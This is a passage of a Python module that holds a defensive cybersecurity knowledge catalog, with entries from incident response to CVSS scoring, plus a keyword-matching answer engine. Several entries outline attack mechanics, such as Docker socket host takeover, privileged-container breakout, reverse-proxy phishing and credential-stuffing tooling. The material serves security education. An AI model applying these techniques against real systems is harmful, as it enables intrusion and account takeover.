        title="Incident Response Lifecycle (NIST SP 800-61 & SANS PICERL)",
        domain="Incident Management & SecOps",
        keywords=["incident response", "nist 800-61", "sans picerl", "containment", "eradication", "order of volatility"],
        summary="The standardized multi-phase framework for managing, containing, and recovering from cybersecurity breaches.",
        mechanics=(
            "1. **Preparation**: Tooling, communication channels, call trees, backups, and forensic readiness.\n"
            "2. **Identification / Triage**: Validating alerts, determining scope, establishing chain of custody.\n"
            "3. **Containment**: Short-term (network isolation, account disablement) and long-term (temporary routing changes, system patching).\n"
            "4. **Eradication**: Removing malware, terminating backdoor accounts, revoking compromised certificates.\n"
            "5. **Recovery**: Restoring verified systems from clean backups, monitoring for persistence.\n"
            "6. **Lessons Learned**: Post-incident review, documentation, updating detection rules and playbooks."
        ),
        examples="SecOps team responding to a ransomware outbreak: isolating infected VLANs (Containment), re-imaging compromised hosts (Eradication), and restoring from air-gapped backups (Recovery).",
        detection="Establish continuous incident timelines correlating initial access vectors through exfiltration.",
        mitigation="Conduct regular tabletop exercises, maintain offline IR runbooks, and automate containment via PolicyEngine guardrails.",
        mitre_ids=["T1082"]
    ),
    CyberKnowledgeItem(
        key="threat_hunting_and_ioc_ioa",
        title="Threat Hunting: Indicators of Compromise (IOC) vs Indicators of Attack (IOA)",
        domain="Proactive Threat Hunting",
        keywords=["threat hunting", "ioc vs ioa", "indicators of compromise", "indicators of attack", "pyramid of pain"],
        summary="Proactive hypothesis-driven pursuit of adversaries that have bypassed automated security controls.",
        mechanics=(
            "- **Indicators of Compromise (IOC)**: Forensic evidence of past intrusion (file hashes, known malicious IP addresses, domain names). Reactive and easily changed by adversaries (bottom of the Pyramid of Pain).\n"
            "- **Indicators of Attack (IOA)**: Behavioral patterns and intent (process injection, privilege escalation, lateral movement via SMB). Proactive and independent of specific tooling or hashes (top of the Pyramid of Pain: TTPs)."
        ),
        examples="Hunting for LOLBins executing with encoded base64 parameters across workstation fleets rather than searching for known MD5 hashes.",
        detection="Formulate hypotheses (e.g., 'An adversary is abusing Scheduled Tasks for persistence'), query SIEM/EDR datasets, and investigate statistical anomalies.",
        mitigation="Translate confirmed hunting findings into permanent automated Sigma and YARA detection rules.",
        mitre_ids=["T1053.005"]
    ),

    # -------------------------------------------------------------------------
    # 6. CRYPTOGRAPHY & DATA PROTECTION
    # -------------------------------------------------------------------------
    CyberKnowledgeItem(
        key="symmetric_vs_asymmetric_crypto",
        title="Symmetric vs Asymmetric Cryptography & Hybrid Encryption",
        domain="Applied Cryptography",
        keywords=["symmetric vs asymmetric", "cryptography", "aes", "rsa", "ecc", "public key", "private key", "diffie-hellman"],
        summary="The mathematical foundations of modern data encryption, key exchange, and digital signatures.",
        mechanics=(
            "- **Symmetric Encryption (Single Secret Key)**: Same key used for encryption and decryption. Very fast; ideal for large bulk data (AES-256, ChaCha20). Challenge: secure key distribution.\n"
            "- **Asymmetric Encryption (Public/Private Key Pair)**: Data encrypted with Public Key can only be decrypted by Private Key. Slower; ideal for key exchange and digital signatures (RSA, ECC Curve25519).\n"
            "- **Hybrid Encryption (e.g. TLS/HTTPS)**: Uses asymmetric cryptography (ECDHE) to securely agree upon a shared session key, then switches to symmetric encryption (AES-GCM) for high-speed data transmission."
        ),
        examples="HTTPS web browsing where your browser and web server negotiate an ephemeral AES-GCM session key via Elliptic Curve Diffie-Hellman.",
        detection="Audit cipher suite negotiations in perimeter load balancers for deprecated algorithms (DES, 3DES, RC4, export-grade ciphers).",
        mitigation="Enforce modern authenticated ciphers (AES-256-GCM, ChaCha20-Poly1305), deprecate TLS 1.0 and 1.1, and enforce Perfect Forward Secrecy (PFS).",
        mitre_ids=["T1573.001", "T1573.002"]
    ),
    CyberKnowledgeItem(
        key="password_hashing_and_salting",
        title="Secure Password Hashing, Salting & Key Derivation (Argon2id)",
        domain="Data Protection & Storage",
        keywords=["password hashing", "salting", "argon2id", "bcrypt", "pbkdf2", "rainbow tables", "md5 broken"],
        summary="Cryptographic standards for securely storing user credentials resistant to GPU/ASIC offline cracking.",
        mechanics=(
            "- **Why Plain Hashing Fails**: Fast hashes (MD5, SHA-1, SHA-256) compute billions of iterations per second on modern GPUs and are vulnerable to precomputed Rainbow Tables.\n"
            "- **Salting**: Appending a unique cryptographically random string per user before hashing, rendering precomputed rainbow tables completely ineffective.\n"
            "- **Key Derivation Functions (KDF)**: Computationally and memory-hard algorithms.\n"
            "  * **Argon2id (Winner of Password Hashing Competition)**: Memory-hard, defeating parallel GPU and ASIC hardware attacks.\n"
            "  * **bcrypt**: Adaptive work factor based on Blowfish cipher."
        ),
        examples="Database breach leaking password hashes; Argon2id prevents cracking even with multi-GPU cracking rigs.",
        detection="Audit application source code and database schemas for deprecated MD5/SHA1 hashing functions.",
        mitigation="Enforce **Argon2id** (memory cost: 64MB, time cost: 3 iterations, parallelism: 4) or **bcrypt** (work factor 12+) for all stored credentials.",
        mitre_ids=["T1110.002"]
    ),

    # -------------------------------------------------------------------------
    # 7. ZERO TRUST & ENTERPRISE ARCHITECTURE
    # -------------------------------------------------------------------------
    CyberKnowledgeItem(
        key="zero_trust_architecture",
        title="Zero Trust Architecture & NIST SP 800-207 Principles",
        domain="Enterprise Security Architecture",
        keywords=["zero trust", "nist sp 800-207", "microsegmentation", "least privilege", "assume breach", "never trust always verify"],
        summary="A security paradigm that eliminates implicit trust based on network location, requiring continuous verification for every access request.",
        mechanics=(
            "1. **Never Trust, Always Verify**: Treat internal corporate networks as untrusted internet. Authenticate and authorize every request explicitly based on identity, device posture, location, and risk.\n"
            "2. **Least Privilege Access**: Constrain access via Just-In-Time (JIT) and Just-Enough-Access (JEA) permissions.\n"
            "3. **Assume Breach**: Design architecture assuming adversaries already have a foothold; minimize blast radius via **Microsegmentation**."
        ),
        examples="Employees accessing internal Jira/GitLab portals through an Identity-Aware Proxy (IAP) requiring FIDO2 MFA and device compliance rather than an open corporate VPN.",
        detection="Continuously evaluate UEBA anomaly metrics and cross-reference device telemetry before issuing scoped session tokens.",
        mitigation="Implement Identity-Aware Proxies, microsegment internal networks via software-defined firewalls, and deprecate flat corporate VPN subnets.",
        mitre_ids=["T1078", "T1021"]
    ),
    CyberKnowledgeItem(
        key="cloud_and_container_security",
        title="Cloud & Container Security (Docker & Kubernetes)",
        domain="Cloud Infrastructure Security",
        keywords=["cloud security", "docker", "kubernetes", "k8s", "shared responsibility", "docker socket", "privileged container"],
        summary="Securing cloud environments (AWS, Azure, GCP) and containerized orchestration platforms against breakout and privilege escalation.",
        mechanics=(
            "- **Shared Responsibility Model**: Cloud provider secures the physical infrastructure, hypervisor, and data centers; customer secures data, IAM policies, operating system patches, and network configurations.\n"
            "- **Docker Socket Abuse**: Mounting `/var/run/docker.sock` inside a container gives the container root access over the host Docker daemon, allowing full host takeover.\n"
            "- **Privileged Containers**: Running with `--privileged` disables Linux namespaces and AppArmor/SELinux profiles, enabling container breakout.\n"
            "- **Kubernetes RBAC**: Misconfigured cluster-admin service accounts allowing pods to compromise the entire cluster control plane."
        ),
        examples="Compromised web container using mounted Docker socket to launch a privileged container and access host filesystem root `/`.",
        detection="Monitor CloudTrail for anomalous IAM privilege escalation (`iam:CreatePolicyVersion`, `sts:AssumeRole`) and audit container manifests with Falco for container breakouts.",
        mitigation="Enforce Kubernetes Pod Security Standards (PSS Restricted), never mount `/var/run/docker.sock` in workloads, run containers as non-root users (`USER 1000`), and enforce immutable read-only root filesystems.",
        mitre_ids=["T1611", "T1613"]
    ),

    # -------------------------------------------------------------------------
    # 8. SOCIAL ENGINEERING, PHISHING & THREAT TAXONOMY
    # -------------------------------------------------------------------------
    CyberKnowledgeItem(
        key="phishing_attacks",
        title="Phishing Attacks & Social Engineering Vectors",
        domain="Social Engineering & Email Security",
        keywords=[
            "phishing", "phishing attack", "spear phishing", "whaling", "vishing", 
            "smishing", "credential harvesting", "email spoofing", "what is a phishing attack", 
            "what is phishing", "phishing email", "bec", "business email compromise"
        ],
        summary="A deceptive social engineering attack where adversaries impersonate trusted organizations or individuals (banks, corporate IT, executives) via email, SMS, or voice to deceive victims into revealing credentials, transferring money, or downloading malware.",
        mechanics=(
            "1. **Email Spoofing & Lookalike Domains**: Attackers register typosquatted domains (e.g. `chase-security.com`) or forge display names and sender headers when email authentication is misconfigured.\n"
            "2. **Psychological Triggers**: Exploit urgency, fear, authority, or curiosity (e.g., 'Account Suspended: Immediate Action Required', 'Unpaid Invoice Notice').\n"
            "3. **Primary Phishing Variants**:\n"
            "   - **Bulk Phishing**: Untargeted mass emails harvesting login credentials or spreading generic malware.\n"
            "   - **Spear Phishing**: Customized, highly targeted attacks directed at specific individuals using reconnaissance from social media or corporate directories.\n"
            "   - **Whaling**: Spear phishing targeting high-profile C-level executives or finance directors (Business Email Compromise - BEC) to authorize high-value wire transfers.\n"
            "   - **Smishing (SMS) & Vishing (Voice)**: Fraudulent text messages or automated phone calls impersonating fraud departments.\n"
            "   - **Reverse-Proxy Phishing (Evilginx)**: In-line man-in-the-middle proxies serving real login portals to steal session cookies and bypass standard 2FA."
        ),
        examples="An employee receives an urgent email appearing to come from Microsoft 365 Support with a link to `login.microsoftonline.com.secure-auth.net` requesting credential verification, resulting in account takeover.",
        detection="Verify SPF, DKIM, and DMARC alignment (`p=reject`), monitor email gateway logs for newly registered domains (NRDs) and IP-in-URL hyperlinks, and inspect email body text for urgency language.",
        mitigation="Enforce strict **DMARC policies (`p=reject`)**, deploy phishing-resistant **FIDO2 / WebAuthn hardware security keys** (which bind authentication to the true domain origin, neutralizing proxy phishing), implement automated email sandboxing, and conduct regular employee phishing simulations.",
        mitre_ids=["T1566.001", "T1566.002", "T1566.003"]
    ),
    CyberKnowledgeItem(
        key="malware_types",
        title="Malware Classifications & Infection Vectors",
        domain="Endpoint Security & Malware Analysis",
        keywords=["malware", "virus", "worm", "trojan", "spyware", "keylogger", "types of malware", "what is malware"],
        summary="Malicious software specifically engineered to compromise system integrity, steal confidential data, disrupt operational continuity, or grant unauthorized remote access.",
        mechanics=(
            "- **Viruses**: Malicious code that attaches to legitimate executable files and replicates when the host program is executed.\n"
            "- **Worms**: Standalone malware that self-replicates across networks by exploiting unpatched protocol vulnerabilities (e.g., WannaCry via SMBv1 EternalBlue) without user interaction.\n"
            "- **Trojans**: Programs masquerading as benign utilities (e.g. cracked installers, invoice PDFs) that silently deploy backdoors or infostealers.\n"
            "- **Ransomware**: Encrypts victim storage using asymmetric/symmetric hybrid encryption and demands payment for private decryption keys.\n"
            "- **Spyware & Keyloggers**: Secretly monitors user keystrokes, webcam feeds, and clipboard data, exfiltrating credentials to C2 infrastructure.\n"
            "- **Rootkits**: Kernel-level or firmware-level software designed to conceal processes, sockets, and files from operating system APIs and EDR agents."
        ),
        examples="A user downloads an infected PDF disguised as a vendor invoice, executing an embedded macro that downloads and runs an infostealer Trojan.",
        detection="Monitor behavioral EDR telemetry (unusual parent-child process relationships, unauthorized scheduled tasks, LSASS memory dumping) and cross-reference file hashes against threat intelligence.",
        mitigation="Deploy EDR with active behavioral protection, restrict local administrator privileges, maintain aggressive patch management schedules, and block macro execution in files from the internet.",
        mitre_ids=["T1204", "T1059"]
    ),
    CyberKnowledgeItem(
        key="social_engineering",
        title="Social Engineering Tactics & Human Risk",
        domain="Human Risk & Behavioral Security",
        keywords=["social engineering", "pretexting", "baiting", "quid pro quo", "tailgating", "what is social engineering"],
        summary="The psychological manipulation of individuals into divulging confidential information, granting physical access, or performing security-compromising actions.",
        mechanics=(
            "- **Pretexting**: Establishing a believable invented persona (e.g. IT support technician, company auditor) to deceive employees into surrendering credentials or access.\n"
            "- **Baiting**: Leaving infected USB flash drives in company lobbies or parking lots labeled 'Confidential Executive Salaries' to entice victims into plugging them in.\n"
            "- **Tailgating / Piggybacking**: Following authorized personnel through badge-controlled access doors without scanning credentials.\n"
            "- **Quid Pro Quo**: Offering an ostensible benefit or service (e.g. 'free security software cleanup') in exchange for login credentials."
        ),
        examples="An attacker calls an employee pretending to be from the IT helpdesk, requesting their one-time passcode to 'fix an email sync error'.",
        detection="Monitor employee reports of suspicious phone calls, correlate failed authentication spikes following executive social media announcements.",
        mitigation="Implement multi-party verification protocols for sensitive requests (financial transfers, password resets), conduct interactive employee awareness training, and enforce physical security barriers (turnstiles).",
        mitre_ids=["T1566", "T1598"]
    ),
    CyberKnowledgeItem(
        key="ddos_attacks",
        title="Distributed Denial of Service (DDoS) Attacks & Defenses",
        domain="Network Availability & Perimeter Defense",
        keywords=["ddos", "distributed denial of service", "ddos attack", "volumetric attack", "amplification attack", "what is ddos"],
        summary="A coordinated attempt to exhaust server, network, or application availability by overwhelming targets with massive floods of malicious internet traffic originating from distributed botnets.",
        mechanics=(
            "- **Volumetric Floods**: Satiate raw physical bandwidth (UDP Floods, ICMP Echo Floods, DNS/NTP Reflection Amplification where small spoofed queries elicit 50x larger responses).\n"
            "- **Protocol Layer Attacks**: Exhaust connection state tables on perimeter firewalls, load balancers, and web servers (SYN Floods, Ping of Death).\n"
            "- **Application Layer Floods (Layer 7)**: Overwhelm server compute/database threads with complex HTTP GET/POST requests that appear legitimate but consume maximum server CPU."
        ),
        examples="Adversaries directing a Mirai botnet of 100,000 infected IoT cameras to flood an enterprise DNS provider with 1.2 Tbps of UDP traffic.",
        detection="Real-time NetFlow/IPFIX anomaly monitoring identifying sudden spikes in bits-per-second (BPS) or packets-per-second (PPS) and asymmetric inbound-to-outbound traffic ratios.",
        mitigation="Deploy cloud DDoS mitigation scrubbers (Cloudflare, AWS Shield, Akamai), utilize BGP Anycast routing to disperse traffic across global PoPs, and implement BCP 38 ingress filtering.",
        mitre_ids=["T1498", "T1499"]
    ),
    CyberKnowledgeItem(
        key="zero_day",
        title="Zero-Day Vulnerabilities & Exploit Lifecycle",
        domain="Vulnerability Management & Exploitation",
        keywords=["zero day", "zero-day", "0-day", "cve", "cvss", "vulnerability lifecycle"],
        summary="A software flaw unknown to the vendor or developers, leaving systems vulnerable to exploitation with zero days of defensive patch availability.",
        mechanics=(
            "1. **Discovery**: Vulnerability discovered by researchers, nation-state intelligence agencies, or cybercriminal exploit brokers.\n"
            "2. **Weaponization**: Functional exploit code authored to achieve remote code execution, privilege escalation, or authentication bypass.\n"
            "3. **In-the-Wild Exploitation**: Attacks executed against high-value targets while signature-based antiviruses have zero signatures.\n"
            "4. **Disclosure & Patching**: Vendor is notified, assigns a CVE, issues an emergency patch, and publishes mitigation advisories."
        ),
        examples="The Log4Shell (CVE-2021-44228) vulnerability in Apache Log4j allowing unauthenticated remote code execution via a simple JNDI lookup string.",
        detection="Heuristic and behavioral anomaly detection in EDR/SIEM, monitoring memory corruption exceptions, and detecting unauthorized child processes spawned by server daemons.",
        mitigation="Adopt Zero Trust architecture, minimize attack surface, enforce least privilege, deploy virtual patching via WAF/IPS rule sets, and apply defense-in-depth controls.",
        mitre_ids=["T1190", "T1068"]
    ),
    CyberKnowledgeItem(
        key="mitre_attack_framework",
        title="MITRE ATT&CK Framework Architecture & Matrix",
        domain="Cyber Threat Intelligence & TTPs",
        keywords=["mitre attack", "mitre att&ck", "tactics", "techniques", "ttps", "what is mitre"],
        summary="The globally standard knowledge base of adversary Tactics, Techniques, and Procedures (TTPs) based on real-world threat observations, used to evaluate and improve enterprise security posture.",
        mechanics=(
            "- **Tactics (The 'Why')**: The high-level objective of an adversary at each step (e.g. Initial Access, Execution, Persistence, Privilege Escalation, Defense Evasion, Credential Access, Lateral Movement, Collection, Exfiltration, Impact).\n"
            "- **Techniques (The 'How')**: The specific technical method used to accomplish the tactic (e.g. T1110 Brute Force, T1059 Command and Scripting Interpreter).\n"
            "- **Sub-Techniques**: Granular variations (e.g. T1110.001 Password Guessing, T1110.003 Password Spraying).\n"
            "- **Procedures**: The documented implementations used by specific threat actors."
        ),
        examples="Mapping an incident timeline: Initial Access via T1566 (Phishing) -> Execution via T1059.001 (PowerShell) -> Lateral Movement via T1021.002 (SMB Shares).",
        detection="Align SIEM correlation alerts and Sigma rules directly with ATT&CK technique IDs to measure enterprise detection coverage.",
        mitigation="Cross-reference with MITRE D3FEND defensive countermeasures to address identified detection and mitigation blind spots.",
        mitre_ids=["TA0001", "TA0002", "TA0008"]
    ),
    CyberKnowledgeItem(
        key="buffer_overflow",
        title="Buffer Overflow Vulnerabilities & Memory Protection",
        domain="Software Security & Exploit Mitigation",
        keywords=["buffer overflow", "stack overflow", "heap overflow", "aslr", "dep", "stack canary", "shellcode"],
        summary="A memory corruption anomaly where a program writes more data to a memory buffer than its boundary allows, overwriting adjacent memory and hijacking execution flow.",
        mechanics=(
            "- In vulnerable C/C++ applications, functions like `strcpy()`, `gets()`, or `sprintf()` do not check input boundaries.\n"
            "- An attacker supplies input exceeding buffer size, overwriting the **Saved Frame Pointer** and the **Saved Return Address (EIP/RIP)** on the stack.\n"
            "- When the function returns, control flow redirects to attacker-controlled memory (shellcode) or Return-Oriented Programming (ROP) gadgets."
        ),
        examples="Classic Morris Worm exploiting `gets()` in Unix `fingerd`, or remote code execution in network routers via unbuffered packet headers.",
        detection="Monitor crash dumps for `SIGSEGV` segmentation faults and inspect EDR logs for anomalous execution from stack or heap memory regions.",
        mitigation="Compile with compiler mitigations: **Stack Canaries** (`-fstack-protector-all`), **Data Execution Prevention (DEP / NX bit)**, and **Address Space Layout Randomization (ASLR)**; migrate critical components to memory-safe languages (Rust, Go).",
        mitre_ids=["T1203", "T1059"]
    ),
    CyberKnowledgeItem(
        key="credential_stuffing",
        title="Credential Stuffing Attacks & Automated Account Takeover",
        domain="Identity & Web Application Security",
        keywords=["credential stuffing", "account takeover", "ato", "breached credentials", "what is credential stuffing"],
        summary="Automated injection of stolen username/password combinations harvested from past data breaches against secondary websites to achieve account takeover.",
        mechanics=(
            "1. Threat actors obtain massive credential dumps (e.g. from breach compilation databases).\n"
            "2. Automated bot programs (e.g. OpenBullet, Sentry MBA) cycle through millions of credentials across banking, retail, and corporate portals.\n"
            "3. Because 60%+ of users reuse passwords across personal and professional accounts, bots achieve a 1-3% success rate, compromising legitimate accounts without attacking enterprise infrastructure."
        ),
        examples="Bots submitting 500,000 username/password pairs per hour against an airline loyalty portal, successfully taking over 5,000 accounts.",
        detection="Monitor web application login endpoints for abnormal spikes in authentication attempts, high ratios of failed-to-successful logins, and traffic originating from known residential proxy networks.",
        mitigation="Mandate Multi-Factor Authentication (MFA), deploy bot protection solutions with CAPTCHA step-ups, check passwords against breached credential APIs (HaveIBeenPwned), and enforce device fingerprinting.",
        mitre_ids=["T1110.004"]
    ),
    CyberKnowledgeItem(
        key="man_in_the_middle",
        title="Man-in-the-Middle (MitM) Attacks & Network Interception",
        domain="Network Transport Security",
        keywords=["mitm", "man in the middle", "man-in-the-middle", "ssl stripping", "session hijacking", "traffic interception"],
        summary="An attack where the adversary secretly relays and potentially alters communication between two parties who believe they are directly communicating with each other.",
        mechanics=(
            "1. Adversary positions themselves between client and server via ARP spoofing, rogue DHCP, DNS spoofing, or rogue Wi-Fi access points.\n"
            "2. In HTTPS connections, attackers execute SSL Stripping (converting HTTPS to unencrypted HTTP) or present spoofed certificates if clients ignore TLS validation warnings.\n"
            "3. Stolen session tokens, cleartext credentials, or sensitive transaction parameters are extracted or modified in transit."
        ),
        examples="Attacker deploying a Wi-Fi Pineapple in an airport or coffee shop to intercept unencrypted employee HTTP requests.",
        detection="Monitor for duplicate ARP mappings on LAN switches, inspect network flows for anomalous TLS certificate authorities, and deploy Dynamic ARP Inspection (DAI).",
        mitigation="Enforce HTTP Strict Transport Security (HSTS with preloading), mandate TLS 1.3 with Certificate Pinning, disable insecure cipher suites, and use end-to-end encrypted VPN tunnels.",
        mitre_ids=["T1557", "T1557.001", "T1557.002"]
    ),
    CyberKnowledgeItem(
        key="vpn_and_ipsec",
        title="Virtual Private Networks (VPN), IPsec & Secure Tunneling",
        domain="Enterprise Network & Perimeter Defense",
        keywords=["vpn", "ipsec", "wireguard", "openvpn", "secure tunnel", "ikev2", "esp"],
        summary="Cryptographic network tunneling mechanisms that establish encrypted virtual communication channels across untrusted public networks.",
        mechanics=(
            "- **IPsec Architecture**: Operates at Layer 3 using Authentication Header (AH) for integrity and Encapsulating Security Payload (ESP) for encryption and integrity.\n"
            "- **Key Exchange (IKEv2)**: Authenticates endpoints and negotiates symmetric encryption keys via Diffie-Hellman ephemeral exchange.\n"
            "- **Modern Protocols**: WireGuard (lean, modern crypto primitives like ChaCha20-Poly1305 and Curve25519) and OpenVPN (TLS-based Layer 2/3 tunneling)."
        ),
        examples="Remote employees securely accessing corporate cloud VPC subnets over public hotel Wi-Fi without exposing internal database ports.",
        detection="Audit VPN gateway connection logs for concurrent sessions from disparate geo-locations, anomalous off-hours logon bursts, and protocol downgrade attempts.",
        mitigation="Enforce MFA on all VPN ingress gateways, mandate post-quantum or AES-256-GCM ciphers, and implement Zero Trust Network Access (ZTNA) to replace flat network VPN access.",
        mitre_ids=["T1133"]
    ),
    CyberKnowledgeItem(
        key="honeypots",
        title="Deception Technology, Honeypots & Canary Tokens",
        domain="Threat Deception & Early Warning Sensors",
        keywords=["honeypot", "honeynet", "canary token", "deception technology", "honeytoken", "cowrie"],
        summary="Deliberately decoy assets, credentials, or systems deployed within an enterprise network to detect, deflect, and study adversary intrusion activity with near-zero false positive rates.",
        mechanics=(
            "- **Low-Interaction Honeypots**: Simulate specific services (e.g., Cowrie simulating SSH/Telnet) to capture brute-force credentials and initial exploit payloads without running real OS services.\n"
            "- **High-Interaction Honeypots**: Run real operating systems in isolated sandbox VLANs to capture full multi-stage adversary post-exploitation tradecraft.\n"
            "- **Canary Tokens**: Unique fake API keys, AWS credentials, or macro-enabled documents planted in corporate repositories; any access immediately triggers high-priority SOC alerts."
        ),
        examples="Placing a fake AWS root access key `AKIA...` in a git repository that triggers an alert the moment an attacker attempts to call `aws sts get-caller-identity`.",
        detection="Any traffic or authentication attempt to a honeypot or canary token represents verified unauthorized activity (zero false positives).",
        mitigation="Use honeypot threat telemetry to instantly feed perimeter firewall blocklists and trigger automated host containment for compromised internal endpoints.",
        mitre_ids=["T1562.001"]
    ),
    CyberKnowledgeItem(
        key="least_privilege",
        title="Principle of Least Privilege (PoLP) & Access Control",
        domain="Identity Governance & Enterprise Access Control",
        keywords=["least privilege", "polp", "rbac", "abac", "privileged access management", "pam", "jit"],
        summary="A foundational cybersecurity architectural concept mandating that every user, service, and process be granted only the minimum access rights necessary to perform authorized duties.",
        mechanics=(
            "- **Role-Based Access Control (RBAC)**: Assigns permissions to organizational roles rather than individual user accounts.\n"
            "- **Attribute-Based Access Control (ABAC)**: Evaluates dynamic context (device posture, IP location, time of day, risk score) before authorizing sensitive actions.\n"
            "- **Just-In-Time (JIT) Privileged Access**: Replaces permanent standing administrative privileges with temporary, audited, time-bound privilege escalation."
        ),
        examples="Restricting standard developer accounts from accessing production customer databases, requiring an approved ticket to unlock temporary 2-hour read-only access.",
        detection="Audit Active Directory and IAM permission grants for over-privileged service accounts, privilege creep across employee role changes, and excessive sudo permissions.",
        mitigation="Implement Privileged Access Management (PAM) vaults (CyberArk, HashiCorp Vault), eliminate domain admin standing rights, and perform quarterly user access reviews.",
        mitre_ids=["T1078", "T1069"]
    ),
    CyberKnowledgeItem(
        key="cve_cvss",
        title="Vulnerability Scoring (CVE & CVSS v3.1 Metrics)",
        domain="Vulnerability Management & Risk Assessment",
        keywords=["cve", "cvss", "common vulnerabilities and exposures", "vulnerability scoring", "cvss score", "base score"],
        summary="Standardized frameworks for cataloging security vulnerabilities (CVE) and quantifying their technical severity and exploitability (CVSS v3.1).",
        mechanics=(
            "- **Common Vulnerabilities and Exposures (CVE)**: Unique identifiers (e.g. `CVE-2021-44228` Log4Shell) assigned by CVE Numbering Authorities (CNAs).\n"
            "- **CVSS v3.1 Base Metrics** (0.0 to 10.0 scale):\n"
            "  1. **Attack Vector (AV)**: Network (N), Adjacent (A), Local (L), Physical (P)\n"
            "  2. **Attack Complexity (AC)**: Low (L) vs High (H)\n"
            "  3. **Privileges Required (PR)**: None (N), Low (L), High (H)\n"
            "  4. **User Interaction (UI)**: None (N) vs Required (R)\n"
            "  5. **Scope (S)**: Unchanged (U) vs Changed (C)\n"
            "  6. **Impact Metrics (CIA)**: Confidentiality, Integrity, Availability (None, Low, High)\n"
            "- **Severity Ratings**: Low (0.1–3.9), Medium (4.0–6.9), High (7.0–8.9), Critical (9.0–10.0)."
        ),
        examples="Log4Shell (`CVE-2021-44228`) scored CVSS 10.0 (Critical): Network vector, Low complexity, No privileges required, No user interaction, Scope Changed, High impact across CIA.",
        detection="Scan assets with authenticated vulnerability scanners (Nessus, Qualys, OpenVAS) and cross-reference software BOMs with CISA Known Exploited Vulnerabilities (KEV) catalog.",
        mitigation="Prioritize patching based on EPSS (Exploit Prediction Scoring System) and CISA KEV presence rather than raw CVSS alone, applying virtual patches via WAFs during zero-day disclosure windows.",
        mitre_ids=["T1190"]
    )
]


class CyberKnowledgeEngine:
    """
    Search and synthesis engine over the structured cybersecurity knowledge catalog.
    Answers any technical, architectural, or procedural cybersecurity query with
    expert-level depth, protocol precision, and actionable mitigations.
    """
    def __init__(self):
        self.catalog = KNOWLEDGE_CATALOG

    def find_best_match(self, query: str) -> Optional[CyberKnowledgeItem]:
        q = query.lower().strip()
        best_item: Optional[CyberKnowledgeItem] = None
        max_score = 0

        for item in self.catalog:
            score = 0
            # Direct title match
            if item.title.lower() in q:
                score += 50
            if item.key.replace("_", " ") in q:
                score += 40

            # Keyword matches
            for kw in item.keywords:
                if kw in q:
                    score += 25
                else:
                    # Check individual words in multi-word keywords
                    kw_words = [w for w in kw.split() if len(w) > 3]
                    if kw_words and all(w in q for w in kw_words):
                        score += 15

            # Domain match
            if item.domain.lower() in q:
                score += 20

            # General word overlap
            q_words = [w for w in re.findall(r'\b[a-zA-Z]{4,}\b', q)]
            item_text = (item.title + " " + item.summary + " " + item.mechanics).lower()
            for w in q_words:
                if w in item_text:
                    score += 2

            if score > max_score and score >= 15:
                max_score = score
                best_item = item

        return best_item

    def answer_query(self, query: str) -> Optional[str]:
        match = self.find_best_match(query)
        if match:
            return match.format_markdown()
        return None

    def synthesize_general_answer(self, query: str, rag_results: Optional[List[Dict[str, Any]]] = None) -> str:
        """
        Synthesizes a structured, expert cybersecurity response for technical inquiries
        that did not match a pre-indexed catalog entry. Uses retrieved RAG techniques or
        deep domain knowledge synthesis.
        """
        clean_q = query.strip()
        sections = [
            f"### Cybersecurity Analysis & Guidance\n\n**Query**: *{clean_q}*"
        ]

        if rag_results:
            rag_blocks = []
            for r in rag_results:
                if r.get("source") == "mitre_attack":
                    rag_blocks.append(
                        f"#### {r['title']} ({r.get('tactic', 'Tactics')})\n\n"
                        f"- **Guideline**: {r.get('guidelines', 'Active threat monitoring.')}\n"
                        f"- **Mitigations**: {', '.join(r.get('mitigations', ['Enforce least privilege access.']))}\n"
                    )
                elif r.get("source") == "sigma_rule":
                    rag_blocks.append(
                        f"#### Detection Rule: {r['title']} (Severity: {r.get('severity', 'HIGH').upper()})\n\n"
                        f"- **Logic**: `{r.get('logic', '')}`\n"
                        f"- **False Positives**: {', '.join(r.get('false_positives', []))}\n"
                    )
                elif r.get("source") == "defensive_playbook":
                    rag_blocks.append(
                        f"#### Playbook: {r['title']}\n\n"
                        f"- **Containment Actions**: {', '.join(r.get('actions', []))}\n"
                    )
            if rag_blocks:
                sections.append("**Correlated Threat Frameworks & Mitigations**:\n\n" + "\n\n".join(rag_blocks))

        sections.append(
            "**Technical Overview & Threat Context**:\n"
            f"In enterprise cybersecurity operations, addressing inquiries regarding *{clean_q}* requires "
            "evaluating the complete threat lifecycle—from initial reconnaissance and delivery to lateral movement and impact. "
            "Modern threat actors continuously refine automated tooling to evade static detection filters and exploit misconfigurations across network, identity, and application boundaries."
        )

        sections.append(
            "**Core Detection & Observability Strategy**:\n"
            "- **Telemetry Ingestion**: Correlate endpoint EDR process events, perimeter firewall flows, DNS query entropy, and identity provider (IdP) authentication audits in real time.\n"
            "- **Behavioral Anomaly Detection**: Monitor for deviations from baseline behavioral velocity, abnormal credential access sequences, and high-frequency failure patterns.\n"
            "- **MITRE ATT&CK Mapping**: Cross-reference observed telemetry with known adversary tactics, techniques, and procedures (TTPs) to track campaign progression."
        )

        sections.append(
            "**Defensive Remediation & Operational Hardening**:\n"
            "1. **Enforce Zero Trust Principles**: Eliminate implicit trust based on network topology; require continuous identity verification with phishing-resistant FIDO2 MFA.\n"
            "2. **Least Privilege & Microsegmentation**: Restrict lateral movement vectors across internal subnets through fine-grained ingress/egress firewall policies and JIT access control.\n"
            "3. **Automated Incident Response**: Deploy automated containment playbooks (e.g., automated perimeter IP isolation, session revocation, compromised asset quarantine) to shrink adversary dwell time."
        )

        return "\n\n".join(sections)


cyber_knowledge_engine = CyberKnowledgeEngine()

